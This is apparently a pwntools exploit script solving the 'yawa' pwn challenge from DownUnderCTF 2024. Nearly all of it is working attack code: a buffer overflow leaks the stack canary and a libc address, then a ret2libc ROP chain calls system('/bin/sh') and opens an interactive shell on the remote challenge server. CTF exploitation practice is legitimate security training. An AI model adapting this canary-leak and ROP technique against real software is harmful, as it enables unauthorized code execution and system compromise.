#!/usr/bin/env python3
from pwn import *

exe = elf = context.binary = ELF(args.EXE or './yawa')
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF(elf.libc.path)

host = args.HOST or '2024.ductf.dev'
port = int(args.PORT or 30010)

# ./exploit.py LOCAL GDB
def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=False, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
# tbreak main
# b *main+73
b *main+142
continue
'''.format(**locals())

io = start()

payload = b"A" * (8*10) + b"B"*8
io.sendlineafter(b"> ", b"1")
io.sendline(payload)

io.sendlineafter(b"> ", b"2")
print(io.recvline())
canary = u64( b"\x00"+io.recvline()[:-2] )

# leak the libc
payload = b"A" * ((8*13)-1)
io.sendlineafter(b"> ", b"1")
io.sendline(payload)

io.sendlineafter(b"> ", b"2")
io.recvline()
libc.address = u64( io.recvline()[:-1].ljust(8, b"\x00") ) - 0x29d90

pop_rdi = libc.address + 0x000000000002a3e5 # : pop rdi ; ret
ret = libc.address + 0x0000000000029139# : ret
system_addr = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh")) 

# control rip
payload  = b"A" * (8 * 11)
payload += p64(canary)
payload += p64(0)
payload += p64( pop_rdi )
payload += p64(binsh)
payload += p64(ret)
payload += p64(system_addr)

io.sendlineafter(b"> ", b"1")

io.sendline(payload)

# trigger the ret
io.sendlineafter(b"> ", b"3")

print(f"libc_address -> {hex(libc.address)}")
print(f"Canary -> {hex(canary)}")
print(f"payload length {hex(len(payload))}")

io.interactive()
